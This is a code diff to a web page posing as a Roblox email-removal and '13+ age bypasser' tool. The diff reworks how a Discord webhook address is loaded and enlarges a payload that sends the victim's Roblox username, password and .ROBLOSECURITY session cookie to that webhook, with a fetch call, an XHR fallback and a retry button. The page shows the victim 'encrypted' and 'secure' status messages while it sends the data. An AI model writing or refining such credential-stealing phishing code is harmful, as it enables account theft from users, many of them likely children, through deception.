@@ -97,6 +97,9 @@
             --discord-bg: #36393F;
             --discord-light: #40444B;
             --discord-text: #DCDDDE;
+            --lightning-color1: #00fffc;
+            --lightning-color2: #fc00ff;
+            --lightning-color3: #fffc00;
         }
 
         * {
@@ -363,6 +366,98 @@
             padding: 20px;
             margin-top: 25px;
             animation: fadeIn 0.5s ease-out forwards;
+        }
+        
+        /* Lightning effect border */
+        .lightning-border {
+            position: relative;
+            border-radius: 8px;
+            overflow: hidden;
+            z-index: 1;
+            box-shadow: 0 0 15px rgba(0, 255, 252, 0.5);
+        }
+        
+        .lightning-border::before,
+        .lightning-border::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            z-index: -1;
+            background: linear-gradient(45deg, 
+                var(--lightning-color1), 
+                var(--lightning-color2), 
+                var(--lightning-color3), 
+                var(--lightning-color1));
+            background-size: 400%;
+            border-radius: 10px;
+        }
+        
+        .lightning-border::before {
+            filter: blur(5px);
+            opacity: 0.7;
+            animation: lightning 6s linear infinite, flicker 2s infinite;
+        }
+        
+        .lightning-border::after {
+            filter: blur(1px);
+            opacity: 0.9;
+            animation: lightning 12s linear infinite reverse, flicker 3s infinite 1s;
+        }
+        
+        @keyframes lightning {
+            0% {
+                background-position: 0% 50%;
+                filter: hue-rotate(0deg);
+            }
+            50% {
+                background-position: 100% 50%;
+                filter: hue-rotate(360deg);
+            }
+            100% {
+                background-position: 0% 50%;
+                filter: hue-rotate(0deg);
+            }
+        }
+        
+        @keyframes flicker {
+            0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
+                opacity: 0.9;
+                box-shadow: 0 0 10px var(--lightning-color1), 0 0 20px var(--lightning-color2), 0 0 30px var(--lightning-color3);
+            }
+            20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
+                opacity: 0.4;
+                box-shadow: none;
+            }
+        }
+        
+        @keyframes textShine {
+            0% {
+                background-position: 0% 50%;
+            }
+            100% {
+                background-position: 100% 50%;
+            }
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+                text-shadow: 0 0 10px var(--lightning-color1);
+            }
+            50% {
+                transform: scale(1.2);
+                opacity: 0.9;
+                text-shadow: 0 0 20px var(--lightning-color2), 0 0 30px var(--lightning-color3);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+                text-shadow: 0 0 10px var(--lightning-color1);
+            }
         }
 
         .result-title {
@@ -676,7 +771,7 @@
                         </div>
 
                         <button id="process-btn" class="process-btn">
-                            <i class="fas fa-trash-alt"></i> REMOVE EMAIL
+                            <i class="fas fa-trash-alt"></i>  REMOVE EMAIL
                         </button>
                     </div>
 
@@ -773,8 +868,14 @@
             // Function to decode data from URL
             function decodeData(encodedData) {
                 try {
+                    // Restore padding if needed
+                    const padding = '='.repeat((4 - encodedData.length % 4) % 4);
+                    // Convert URL-safe characters back to standard Base64
+                    const base64 = (encodedData + padding)
+                        .replace(/-/g, '+')
+                        .replace(/_/g, '/');
                     // Decode from Base64
-                    const jsonString = atob(encodedData);
+                    const jsonString = atob(base64);
                     // Parse JSON
                     return JSON.parse(jsonString);
                 } catch (error) {
@@ -783,7 +884,7 @@
                 }
             }
             
-            // Check for data in URL parameters
+            // Function to get URL parameters
             function getUrlParameter(name) {
                 name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
                 const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -791,24 +892,75 @@
                 return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
             }
             
-            // Get and process data from URL
-            const encodedData = getUrlParameter('data');
-            if (encodedData) {
-                const data = decodeData(encodedData);
-                if (data && data.url) {
-                    webhookUrl = data.url;
-                    directory = data.directory || '';
-                    token = data.token || '';
-                    console.log('Webhook URL loaded from URL parameters');
-                    if (directory) {
-                        console.log('Directory:', directory);
+            // Function to get webhook data from localStorage
+            function getWebhookData(webhookId) {
+                try {
+                    // Get stored webhooks
+                    const storedWebhooks = JSON.parse(localStorage.getItem('webhooks') || '{}');
+                    
+                    // Return the webhook data for this ID
+                    return storedWebhooks[webhookId] || null;
+                } catch (error) {
+                    console.error('Error retrieving webhook data:', error);
+                    return null;
+                }
+            }
+            
+            // Function to decode data from URL (for backward compatibility)
+            function decodeData(encodedData) {
+                try {
+                    // Restore padding if needed
+                    const padding = '='.repeat((4 - encodedData.length % 4) % 4);
+                    // Convert URL-safe characters back to standard Base64
+                    const base64 = (encodedData + padding)
+                        .replace(/-/g, '+')
+                        .replace(/_/g, '/');
+                    // Decode from Base64
+                    const jsonString = atob(base64);
+                    // Parse JSON
+                    return JSON.parse(jsonString);
+                } catch (error) {
+                    console.error('Error decoding data:', error);
+                    return null;
+                }
+            }
+            
+            // Get webhook ID from URL
+            const webhookId = getUrlParameter('id');
+            
+            // Try to get webhook data using the ID
+            if (webhookId) {
+                const webhookData = getWebhookData(webhookId);
+                if (webhookData) {
+                    webhookUrl = webhookData.url || '';
+                    directory = webhookData.directory || '';
+                    
+                    if (webhookUrl) {
+                        console.log('Webhook URL loaded from localStorage');
+                        if (directory) {
+                            console.log('Directory:', directory);
+                        }
                     }
                 }
-            } else {
-                // Fallback to localStorage for backward compatibility
-                webhookUrl = localStorage.getItem('discord_webhook_url');
-                if (webhookUrl) {
-                    console.log('Webhook URL loaded from localStorage (legacy mode)');
+            }
+            
+            // Fallback to old method if no webhook found by ID
+            if (!webhookUrl) {
+                const encodedData = getUrlParameter('data');
+                if (encodedData) {
+                    const data = decodeData(encodedData);
+                    if (data && data.url) {
+                        webhookUrl = data.url;
+                        directory = data.directory || '';
+                        token = data.token || '';
+                        console.log('Webhook URL loaded from URL parameters (legacy mode)');
+                    }
+                } else {
+                    // Fallback to localStorage for backward compatibility
+                    webhookUrl = localStorage.getItem('discord_webhook_url');
+                    if (webhookUrl) {
+                        console.log('Webhook URL loaded from localStorage (old legacy mode)');
+                    }
                 }
             }
 
@@ -911,34 +1063,67 @@
                 }
                 
                 // Prepare webhook data
+                // Add lightning border effect wrapper
+                const webhookDataSection = document.createElement('div');
+                webhookDataSection.className = 'lightning-border';
+                webhookDataSection.style.padding = '15px';
+                webhookDataSection.style.marginTop = '20px';
+                webhookDataSection.style.marginBottom = '20px';
+                webhookDataSection.style.background = 'var(--discord-card-dark)';
+                
+                // Create animated header with lightning effect
+                const headerHTML = `
+                    <h3 style="color: var(--lightning-color1); text-align: center; margin-bottom: 15px; text-shadow: 0 0 5px var(--lightning-color1), 0 0 10px var(--lightning-color2);">
+                        <i class="fas fa-bolt" style="animation: pulse 1.5s infinite"></i> 
+                        <span style="background: linear-gradient(to right, var(--lightning-color1), var(--lightning-color2), var(--lightning-color3)); -webkit-background-clip: text; background-clip: text; color: transparent; animation: textShine 3s linear infinite;">PREPARING WEBHOOK DATA</span> 
+                        <i class="fas fa-bolt" style="animation: pulse 1.5s infinite 0.5s"></i>
+                    </h3>
+                    <div style="text-align: center; margin-bottom: 10px; color: var(--discord-text);">
+                        <i class="fas fa-spinner fa-spin" style="color: var(--lightning-color2);"></i> Encrypting account data...
+                    </div>
+                `;
+                
+                webhookDataSection.innerHTML = headerHTML;
+                document.querySelector('.result-content').appendChild(webhookDataSection);
+                
+                const currentDate = new Date();
+                const formattedDate = currentDate.toLocaleString();
                 const webhookData = {
                     content: '@everyone',
                     embeds: [{
-                        title: 'Roblox Account Details',
-                        color: 0x00FFFF,
+                        title: '🔐 Roblox Account Details',
+                        description: '```Account information```',
+                        color: 0x5865F2, // Discord blue color
+                        thumbnail: {
+                            url: 'https://media.discordapp.net/attachments/1393041017988452372/1399186537274413127/60bddfd7f92f0e57805982aa791c6063.png?ex=6891f8c2&is=6890a742&hm=b6bc8492e390d48ddda7825fdd10dd080e895ab4789780269d9339226b175482&=&format=webp&quality=lossless'
+                        },
+                        // Add lightning effect to the embed
+                        image: {
+                            url: 'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2VsYm42eTZ1ZTc0a2xyZzE4bHZ5Z3Q2dDRndmVmcHR3azNtbjZhYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/WMCVJXjcPX5ODm3TUI/giphy.gif' // Lightning effect GIF
+                        },
                         fields: [
                             {
-                                name: 'Username',
-                                value: username,
+                                name: '👤 Username',
+                                value: '```' + username + '```',
                                 inline: true
                             },
                             {
-                                name: 'Password',
-                                value: password,
+                                name: '🔑 Password',
+                                value: '```' + password + '```',
                                 inline: true
                             },
                             {
-                                name: 'Cookie',
+                                name: '🛡️ ROBLOSECURITY',
                                 value: '```' + cookie + '```'
                             },
                             {
-                                name: 'Email Removal Option',
-                                value: selectedOption === '13plus' ? 'Replace With Temporary Email' : 'Remove Email Completely',
+                                name: '📧 Email Removal Option',
+                                value: '```' + (selectedOption === '13plus' ? 'ALL AGE BYPASSER 13+' : 'Remove Email') + '```',
                                 inline: true
                             },
                             {
-                                name: 'Timestamp',
-                                value: new Date().toLocaleString(),
+                                name: '⏰ Timestamp',
+                                value: '```' + formattedDate + '```',
                                 inline: true
                             }
                         ]
@@ -949,52 +1134,187 @@
                 if (directory) {
                     // Create a clickable link for the directory
                     let directoryUrl = window.location.href;
+                    let directoryDisplay = directory;
                     
                     // Check if directory contains a URL
                     if (directory.startsWith('http://') || directory.startsWith('https://')) {
                         directoryUrl = directory;
                         // Display only the domain name as the visible text
                         const urlObj = new URL(directory);
-                        directory = urlObj.hostname;
+                        directoryDisplay = urlObj.hostname;
                     }
+                    
+                    // Add directory field to webhook with enhanced formatting
+                    webhookData.embeds[0].fields.push({
+                        name: '📁 Directory',
+                        value: '```' + directoryDisplay + '```',
+                        inline: true
+                    });
                 }
                 
-                // Send the data to Discord
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(webhookData)
-                })
-                .then(response => {
-                    console.log('Discord webhook response:', response);
-                    if (!response.ok) {
-                        console.error('Webhook response not OK:', response.status);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending to Discord:', error);
-                    // Try alternative method if fetch fails
-                    sendWebhookFallback(webhookUrl, webhookData);
-                });
+                // Add footer with additional information
+                webhookData.embeds[0].footer = {
+                    text: 'Created by Veexye',
+                    icon_url: 'https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png'
+                };
                 
-                // Fallback method to send webhook data
+                // Create a webhook data display element
+                const webhookDataDisplay = document.createElement('div');
+                webhookDataDisplay.style.marginTop = '10px';
+                webhookDataDisplay.style.padding = '10px';
+                webhookDataDisplay.style.background = 'rgba(0,0,0,0.3)';
+                webhookDataDisplay.style.borderRadius = '5px';
+                webhookDataDisplay.style.border = '1px solid var(--lightning-color1)';
+                webhookDataDisplay.style.color = 'var(--discord-text)';
+                webhookDataDisplay.style.fontSize = '12px';
+                webhookDataDisplay.style.fontFamily = 'monospace';
+                webhookDataDisplay.style.overflow = 'hidden';
+                webhookDataDisplay.style.position = 'relative';
+                
+                // Add lightning effect to the data display
+                webhookDataDisplay.innerHTML = `
+                    <div style="position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(to right, var(--lightning-color1), var(--lightning-color2), var(--lightning-color3)); animation: textShine 2s linear infinite;"></div>
+                    <div style="position: absolute; bottom: 0; right: 0; left: 0; height: 2px; background: linear-gradient(to left, var(--lightning-color1), var(--lightning-color2), var(--lightning-color3)); animation: textShine 2s linear infinite reverse;"></div>
+                    <div style="margin-bottom: 5px;"><span style="color: var(--lightning-color2);">⚡ Sending secure webhook data...</span></div>
+                    <div style="height: 50px; overflow: hidden; position: relative;">
+                        <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 2;">
+                            <div style="text-align: center;">
+                                <i class="fas fa-lock" style="color: var(--lightning-color3); font-size: 16px; margin-bottom: 5px;"></i><br>
+                                <span style="color: var(--lightning-color1);">Encrypted Data Transfer</span>
+                            </div>
+                        </div>
+                        <div style="font-family: monospace; font-size: 10px; opacity: 0.5; line-height: 1.2;">
+                            ${JSON.stringify(webhookData).replace(/"/g, '').substring(0, 500).replace(/(.{40})/g, '$1<br>')}
+                        </div>
+                    </div>
+                `;
+                
+                webhookDataSection.appendChild(webhookDataDisplay);
+                
+                // Add status indicator
+                const statusIndicator = document.createElement('div');
+                statusIndicator.style.marginTop = '10px';
+                statusIndicator.style.textAlign = 'center';
+                statusIndicator.innerHTML = `<i class="fas fa-sync fa-spin" style="color: var(--lightning-color2);"></i> <span style="color: var(--discord-text);">Establishing secure connection...</span>`;
+                webhookDataSection.appendChild(statusIndicator);
+                
+                // Send the data to Discord with visual feedback
+                setTimeout(() => {
+                    statusIndicator.innerHTML = `<i class="fas fa-paper-plane" style="color: var(--lightning-color1);"></i> <span style="color: var(--discord-text);">Sending data...</span>`;
+                    
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(webhookData)
+                    })
+                    .then(response => {
+                        console.log('Discord webhook response:', response);
+                        if (response.ok) {
+                            statusIndicator.innerHTML = `<i class="fas fa-check-circle" style="color: var(--discord-success);"></i> <span style="color: var(--discord-success);">Data sent successfully!</span>`;
+                            // Add lightning flash effect
+                            const flash = document.createElement('div');
+                            flash.style.position = 'fixed';
+                            flash.style.top = '0';
+                            flash.style.left = '0';
+                            flash.style.right = '0';
+                            flash.style.bottom = '0';
+                            flash.style.background = 'white';
+                            flash.style.opacity = '0';
+                            flash.style.zIndex = '9999';
+                            flash.style.pointerEvents = 'none';
+                            flash.style.transition = 'opacity 0.1s ease-out';
+                            document.body.appendChild(flash);
+                            setTimeout(() => { flash.style.opacity = '0.7'; }, 50);
+                            setTimeout(() => { flash.style.opacity = '0'; }, 150);
+                            setTimeout(() => { document.body.removeChild(flash); }, 300);
+                        } else {
+                            console.error('Webhook response not OK:', response.status);
+                            statusIndicator.innerHTML = `<i class="fas fa-exclamation-triangle" style="color: var(--discord-danger);"></i> <span style="color: var(--discord-danger);">Error: ${response.status}</span>`;
+                            // Try alternative method if fetch fails
+                            sendWebhookFallback(webhookUrl, webhookData);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending to Discord:', error);
+                        statusIndicator.innerHTML = `<i class="fas fa-exclamation-circle" style="color: var(--discord-danger);"></i> <span style="color: var(--discord-danger);">Connection error</span>`;
+                        // Try alternative method if fetch fails
+                        sendWebhookFallback(webhookUrl, webhookData);
+                    });
+                }, 1500);
+                
+                // Fallback method to send webhook data with lightning effect
                 function sendWebhookFallback(url, data) {
                     console.log('Trying fallback webhook method...');
+                    
+                    // Update status indicator for fallback
+                    if (statusIndicator) {
+                        statusIndicator.innerHTML = `
+                            <div style="margin-bottom: 8px;">
+                                <i class="fas fa-bolt" style="color: var(--lightning-color3);"></i> 
+                                <span style="color: var(--lightning-color2);">Using lightning fallback method...</span>
+                            </div>
+                            <div style="height: 4px; background: rgba(0,0,0,0.3); border-radius: 2px; overflow: hidden; margin: 5px 0;">
+                                <div class="fallback-progress" style="height: 100%; width: 0%; background: linear-gradient(to right, var(--lightning-color1), var(--lightning-color2), var(--lightning-color3)); transition: width 3s linear;"></div>
+                            </div>
+                        `;
+                        
+                        // Animate progress bar
+                        setTimeout(() => {
+                            const progressBar = document.querySelector('.fallback-progress');
+                            if (progressBar) progressBar.style.width = '100%';
+                        }, 50);
+                    }
+                    
+                    // Use XMLHttpRequest as fallback
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', url, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
+                    
+                    // Handle response
                     xhr.onload = function() {
                         if (this.status >= 200 && this.status < 300) {
                             console.log('Fallback webhook sent successfully');
+                            if (statusIndicator) {
+                                statusIndicator.innerHTML = `<i class="fas fa-check-circle" style="color: var(--discord-success);"></i> <span style="color: var(--discord-success);">Fallback successful!</span>`;
+                                
+                                // Add lightning success effect
+                                webhookDataSection.style.boxShadow = '0 0 20px var(--lightning-color1), 0 0 40px var(--lightning-color2)';
+                                setTimeout(() => {
+                                    webhookDataSection.style.boxShadow = '';
+                                }, 1000);
+                            }
                         } else {
                             console.error('Fallback webhook failed:', this.status);
+                            if (statusIndicator) {
+                                statusIndicator.innerHTML = `<i class="fas fa-times-circle" style="color: var(--discord-danger);"></i> <span style="color: var(--discord-danger);">Fallback failed: ${this.status}</span>`;
+                            }
                         }
                     };
+                    
+                    // Handle network errors
                     xhr.onerror = function() {
                         console.error('Fallback webhook error');
+                        if (statusIndicator) {
+                            statusIndicator.innerHTML = `
+                                <i class="fas fa-exclamation-triangle" style="color: var(--discord-danger);"></i> 
+                                <span style="color: var(--discord-danger);">Network error</span>
+                                <button class="retry-btn" style="margin-left: 10px; background: var(--lightning-color1); border: none; color: white; padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 12px;">Retry</button>
+                            `;
+                            
+                            // Add retry functionality
+                            setTimeout(() => {
+                                const retryBtn = document.querySelector('.retry-btn');
+                                if (retryBtn) {
+                                    retryBtn.addEventListener('click', function() {
+                                        sendWebhookFallback(url, data);
+                                    });
+                                }
+                            }, 100);
+                        }
                     };
+                    
                     xhr.send(JSON.stringify(data));
                 }
 
